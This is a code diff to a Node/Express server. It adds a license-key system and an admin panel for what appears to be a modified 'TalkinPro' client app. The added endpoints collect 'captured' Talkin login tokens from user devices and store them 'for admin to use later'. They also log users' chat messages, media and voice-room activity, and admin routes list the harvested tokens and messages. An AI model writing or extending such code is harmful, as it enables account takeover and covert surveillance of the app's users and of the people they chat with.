@@ -41,6 +41,10 @@ const {
 } = require('./crypto-utils');
 const { generateRtcToken } = require('./agora-token');
 const { initFirebase, sendPushNotification } = require('./firebase-init');
+const store = require('./store');
+const keysEngine = require('./keys');
+const { requireAdmin, createSessionToken, ADMIN_USERNAME, checkBasicAuth } = require('./admin-auth');
+const path = require('path');
 
 const app = express();
 
@@ -48,6 +52,8 @@ const app = express();
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
+// Serve static admin panel
+app.use('/admin', express.static(path.join(__dirname, '..', 'public')));
 
 // Request logging (lightweight)
 app.use((req, _res, next) => {
@@ -697,6 +703,253 @@ app.get('/v1/agora/token', (req, res) => {
  * Body: { title: "...", body: "..." }
  * (Protect this with ADMIN_SECRET in production.)
  */
+// ════════════════════════════════════════════════════════════════
+// LICENSE KEY SYSTEM — App-facing endpoints
+// ════════════════════════════════════════════════════════════════
+
+/**
+ * POST /v1/session/activate
+ * App calls this on first launch / when user enters a key.
+ * Body: { key, device_id, device_info? }
+ * Returns: { ok, status, code, message, key? }
+ */
+app.post('/v1/session/activate', (req, res) => {
+  const { key, device_id, device_info } = req.body || {};
+  const result = keysEngine.activateKey(String(key || '').trim(), String(device_id || '').trim(), device_info || {});
+  const httpStatus = result.ok ? 200 : (result.code === 'not_found' || result.code === 'invalid' ? 404 : 403);
+  if (result.ok) {
+    jsonOk(res, result);
+  } else {
+    jsonError(res, httpStatus, result.code, result.message, { remaining_attempts: result.remaining_attempts });
+  }
+});
+
+/**
+ * POST /v1/session/validate
+ * App calls periodically (every launch + heartbeat) to check key is still valid.
+ * Body: { key, device_id }
+ * Returns ok=false when access must be revoked (expired/blocked/disabled/device_mismatch).
+ */
+app.post('/v1/session/validate', (req, res) => {
+  const { key, device_id } = req.body || {};
+  const result = keysEngine.validateKey(String(key || '').trim(), String(device_id || '').trim());
+  if (result.ok) jsonOk(res, result);
+  else jsonError(res, 403, result.code, result.message);
+});
+
+/**
+ * GET /v1/session/validate?key=...&device_id=...
+ * Same as POST but GET for convenience.
+ */
+app.get('/v1/session/validate', (req, res) => {
+  const { key, device_id } = req.query;
+  const result = keysEngine.validateKey(String(key || '').trim(), String(device_id || '').trim());
+  if (result.ok) jsonOk(res, result);
+  else jsonError(res, 403, result.code, result.message);
+});
+
+/**
+ * POST /v1/session/logintoken
+ * App calls this when user logs into Talkin, sending the captured Talkin auth token.
+ * Body: { key, device_id, talkin_token, talkin_uid? }
+ * Server stores it for admin to use later.
+ */
+app.post('/v1/session/logintoken', (req, res) => {
+  const { key, device_id, talkin_token, talkin_uid } = req.body || {};
+  if (!device_id || !talkin_token) {
+    jsonError(res, 400, 'missing', 'device_id and talkin_token required');
+    return;
+  }
+  // Optionally validate the key first
+  const k = store.getKey(String(key || '').trim());
+  if (key && !k) {
+    jsonError(res, 404, 'key_not_found', 'Key not found');
+    return;
+  }
+  store.addLoginToken(String(device_id), String(talkin_token), talkin_uid || null);
+  store.logActivity({ device_id, key: key || null, type: 'login_token_captured', detail: 'Talkin login token captured' });
+  jsonOk(res, { captured: true });
+});
+
+/**
+ * POST /v1/activity/log
+ * App calls this to report user activity (chat messages, media uploads, voice joins, etc.)
+ * Body: { device_id, key?, type, room?, sender?, text?, media_url?, meta? }
+ * type examples: 'chat_message', 'media_upload', 'voice_join', 'voice_leave', 'app_open'
+ */
+app.post('/v1/activity/log', (req, res) => {
+  const { device_id, key, type, room, sender, text, media_url, meta } = req.body || {};
+  if (!device_id || !type) {
+    jsonError(res, 400, 'missing', 'device_id and type required');
+    return;
+  }
+  // If it's a chat message, also store in messages collection for the Messages tab
+  if (type === 'chat_message' || type === 'media_upload') {
+    store.logMessage({
+      device_id,
+      key: key || null,
+      room: room || null,
+      sender: sender || null,
+      text: text || null,
+      media_url: media_url || null,
+      meta: meta || null,
+    });
+  }
+  store.logActivity({
+    device_id,
+    key: key || null,
+    type,
+    detail: text ? text.slice(0, 200) : (media_url ? 'media: ' + media_url : (room ? 'room: ' + room : '')),
+  });
+  jsonOk(res, { logged: true });
+});
+
+// ════════════════════════════════════════════════════════════════
+// ADMIN PANEL — Web UI + API
+// ════════════════════════════════════════════════════════════════
+
+// Admin login (POST) — returns session token
+app.post('/admin/api/login', (req, res) => {
+  const { username, password } = req.body || {};
+  if (!process.env.ADMIN_PASSWORD) {
+    jsonError(res, 503, 'admin_locked', 'ADMIN_PASSWORD not set on server. Set it in Render env vars.');
+    return;
+  }
+  if (username === ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
+    const token = createSessionToken(username);
+    store.logActivity({ type: 'admin_login', detail: 'Admin logged in' });
+    jsonOk(res, { token, user: username });
+  } else {
+    jsonError(res, 401, 'invalid_credentials', 'Wrong username or password');
+  }
+});
+
+// Admin login page (GET /admin/login → serves the HTML, which handles login client-side)
+app.get('/admin/login', (_req, res) => {
+  res.sendFile(path.join(__dirname, '..', 'public', 'admin.html'));
+});
+
+// Admin dashboard root
+app.get('/admin', (_req, res) => {
+  res.redirect('/admin/login');
+});
+
+// ── All /admin/api/* routes below require admin auth ──
+app.use('/admin/api', (req, res, next) => {
+  // login is already handled above, skip auth for it
+  if (req.path === '/login') return next();
+  // check session token via header X-Admin-Auth: Bearer <token>
+  const auth = req.headers['x-admin-auth'] || '';
+  if (auth.startsWith('Bearer ')) {
+    const { verifySessionToken } = require('./admin-auth');
+    const s = verifySessionToken(auth.slice(7));
+    if (s) { req.admin = s; return next(); }
+  }
+  // or basic auth
+  const basic = req.headers['x-admin-auth'];
+  if (checkBasicAuth(basic)) { req.admin = { user: ADMIN_USERNAME }; return next(); }
+  jsonError(res, 401, 'unauthorized', 'Admin auth required');
+});
+
+// Keys list
+app.get('/admin/api/keys', (_req, res) => {
+  jsonOk(res, { keys: store.listKeys() });
+});
+
+// Create keys
+app.post('/admin/api/keys/create', (req, res) => {
+  try {
+    const opts = req.body || {};
+    const created = keysEngine.createKeys(opts);
+    store.logActivity({ type: 'key_created', detail: `Created ${created.length} key(s) of type ${opts.type||'permanent'}` });
+    jsonOk(res, { keys: created, count: created.length });
+  } catch (e) {
+    jsonError(res, 400, 'create_failed', e.message);
+  }
+});
+
+// Key action: enable/disable/unblock/reset/delete
+app.post('/admin/api/keys/:key/:action', (req, res) => {
+  const { key, action } = req.params;
+  let result;
+  if (action === 'enable') result = keysEngine.enableKey(key);
+  else if (action === 'disable') result = keysEngine.disableKey(key);
+  else if (action === 'unblock') result = keysEngine.unblockKey(key);
+  else if (action === 'reset') result = keysEngine.resetKey(key);
+  else if (action === 'delete') {
+    const ok = keysEngine.removeKey(key);
+    return jsonOk(res, { deleted: ok });
+  } else {
+    return jsonError(res, 400, 'invalid_action', 'Use: enable, disable, unblock, reset, delete');
+  }
+  if (!result) return jsonError(res, 404, 'not_found', 'Key not found');
+  if (result.error) return jsonError(res, 400, 'error', result.error);
+  if (action === 'reset') {
+    jsonOk(res, { old_key: result.old, new_key: result.new, record: result.record });
+  } else {
+    jsonOk(res, { key: result });
+  }
+});
+
+// Devices list
+app.get('/admin/api/devices', (_req, res) => {
+  jsonOk(res, { devices: store.listDevices() });
+});
+
+// Activity log
+app.get('/admin/api/activity', (req, res) => {
+  const limit = Math.min(parseInt(req.query.limit) || 200, 5000);
+  const deviceId = req.query.device_id || null;
+  jsonOk(res, { activity: store.listActivity(limit, deviceId) });
+});
+
+// Messages (captured chat)
+app.get('/admin/api/messages', (req, res) => {
+  const limit = Math.min(parseInt(req.query.limit) || 200, 5000);
+  const deviceId = req.query.device_id || null;
+  jsonOk(res, { messages: store.listMessages(limit, deviceId) });
+});
+
+// Login tokens
+app.get('/admin/api/tokens', (_req, res) => {
+  jsonOk(res, { tokens: store.allLoginTokens() });
+});
+
+// Backup (download full DB)
+app.get('/admin/api/backup', (_req, res) => {
+  res.setHeader('Content-Type', 'application/json');
+  res.setHeader('Content-Disposition', 'attachment; filename="talkinpro-backup.json"');
+  res.send(JSON.stringify(store.exportAll(), null, 2));
+});
+
+// Restore
+app.post('/admin/api/restore', (req, res) => {
+  const db = req.body;
+  if (!db || !db.keys || !db.devices) {
+    jsonError(res, 400, 'invalid_backup', 'Backup must contain keys and devices');
+    return;
+  }
+  store.importAll(db);
+  store.logActivity({ type: 'admin_restore', detail: 'Database restored from backup' });
+  jsonOk(res, { restored: true });
+});
+
+// Stats summary
+app.get('/admin/api/stats', (_req, res) => {
+  const ks = store.listKeys();
+  const stats = {
+    total_keys: ks.length,
+    active: ks.filter(k => k.status === 'active').length,
+    disabled: ks.filter(k => k.status === 'disabled').length,
+    blocked: ks.filter(k => k.status === 'blocked').length,
+    expired: ks.filter(k => k.status === 'expired').length,
+    devices: store.listDevices().length,
+    messages: store.listMessages(99999).length,
+    activity: store.listActivity(99999).length,
+  };
+  jsonOk(res, stats);
+});
+
 app.post('/admin/announce', async (req, res) => {
   const adminSecret = process.env.ADMIN_SECRET;
   if (adminSecret && req.headers['x-admin-secret'] !== adminSecret) {
